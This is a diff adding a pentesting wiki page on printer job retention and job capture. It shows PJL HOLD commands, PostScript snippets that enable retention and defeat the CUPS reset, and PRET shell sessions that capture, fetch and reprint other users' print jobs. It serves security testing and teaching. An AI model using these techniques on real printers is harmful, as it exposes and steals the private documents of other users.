@@ -1,0 +1,114 @@
+---
+description: 'From http://hacking-printers.net/wiki/index.php/Print_job_retention'
+---
+
+# Print Job Retention
+
+## Job Retention
+
+Some printers have stored print jobs accessible from the web server. Usually however, job retention must be explicitly activated for a certain print job and can be done using standard PJL commands or proprietary PostScript code. Jobs are then kept in memory and can be reprinted from the control panel.
+
+### PJL
+
+Legitimate job retention can be enabled for the current document by setting the PJL HOLD variable as shown below:
+
+```text
+@PJL SET HOLD=ON
+[actual data to be printed follows]
+```
+
+Hold jobs are kept in memory and can be reprinted from the printer's control panel. This feature is supported by various printers, however as it seems only some Epson devices allow permanent job retention beeing set using `@PJL DEFAULT HOLD=ON`.
+
+**How to test for this attack?**
+
+Use `hold`command from [**PRET** ](https://github.com/RUB-NDS/PRET)in pjl mode and to check if permanent job retention can be set:
+
+```text
+./pret.py -q printer pjl
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> hold
+Setting job retention, reconnecting to see if still enabled
+Retention for future print jobs: OFF
+```
+
+### PostScript
+
+PostScript offers similar functionality which however is model- and vendor-specific. For the HP LaserJet 4k series and various Kyocera printers, job retention can be enabled by prepending the following commands to a PostScript document:
+
+```text
+<< /Collate true /CollateDetails
+<< /Hold 1 /Type 8 >> >> setpagedevice
+```
+
+While it is theoretically possible to permanently enable PostScript job retention using the [startjob ](./#postscript-ps)operator, this setting is explicitly reset by CUPS at the beginning of each print job using `<< /Collate false >> setpagedevice`. To counter this protection mechanism however, the attacker can permanently redefine the `setpagedevice` operator to have no effect at all.
+
+**How to test for this attack?**
+
+Use `hold`command from [**PRET** ](https://github.com/RUB-NDS/PRET) in ps mode:
+
+```text
+./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> hold
+Job retention enabled.
+```
+
+## Job Capture
+
+It is possible but uncommon to activate job retention in the printing dialog as discussed above. With PostScript however, one has complete access over the current print job and with the [startjob](./#postscript-ps) operator, it is even possible to break out of the server loop and access future jobs. Such functionality has the potential to capture all documents if PostScript is used as a printer driver.
+
+### PostScript
+
+With the capability to hook into arbitrary PostScript operators it is possible to manipulate and access foreign print jobs. To **parse the actual datastream send to the printer**, one can apply a pretty cool feature of the PostScript language: to read its own program code as data using the `currentfile` operator. This way, the whole datastream to be processed by the PostScript interpreter can be accessed by reading and stored to a file on the printer device. If the printer does not offer file system access, **captured documents can be stored in memory**, for example within permanent PostScript dictionaries.   
+One practical problem is to decide **which operator should be hooked** as one does not gain access to the datastream until this operator is processed by the PostScript interpreter. As an attacker wants to capture print jobs from the very beginning, the **redefined operator must be the very first operator** contained in the PostScript document. Fortunately all documents printed with CUPS are pressed into a fixed structure beginning with `currentfile /ASCII85Decode filter /LZWDecode filter cvx exec`. Based on the assumption of such a fixed structure, the attacker can capture documents from the beginning and execute \(aka print\) the file afterwards. For printing systems **other than CUPS** this attack should also be possible, but **operators need to be adapted**. Note that the PostScript header which usually includes media size, user and job names cannot be captured using this method because we first hook into at the beginning of the actual document. Another generic strategy to hook into at the beginning of every print job is to set the `BeginPage` system parameter, if supported by the printer \(most printer do\). This vulnerability has presumably been present in printing devices for decades as solely language constructs defined by the PostScript standard are abused.
+
+Use `capture` command from [**PRET**](https://github.com/RUB-NDS/PRET) in ps mode:
+
+```text
+./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+
+printer:/> capture 
+Print job operations:  capture <operation>
+  capture start   - Record future print jobs.
+  capture stop    - End capturing print jobs.
+  capture list    - Show captured print jobs.
+  capture fetch   - Save captured print jobs.
+  capture print   - Reprint saved print jobs.
+printer:/> capture start
+Future print jobs will be captured in memory!
+printer:/> exit
+```
+
+Now, print arbitrary documents \(make sure PRET is disconnected to not block the printing channel\). Afterwards, you can list, fetch or reprint captured documents:
+
+```text
+./pret.py -q printer ps
+Connection to printer established
+
+Welcome to the pret shell. Type help or ? to list commands.
+printer:/> capture list
+Free virtual memory: 16.6M | Limit to capture:  5.0M
+date          size  user           jobname                 creator             
+───────────────────────────────────────────────────────────────────────────────
+Jan 25 18:38  3.1M  -              -                       -                   
+Jan 25 18:40  170K  -              -                       -                   
+printer:/> capture fetch
+Receiving capture/printer/690782792
+3239748 bytes received. 
+Receiving capture/printer/690646210
+174037 bytes received.
+printer:/> capture print
+printing...
+printing...
+2 jobs reprinted
+printer:/> capture stop
+Stopping job capture, deleting recorded jobs
+```
+
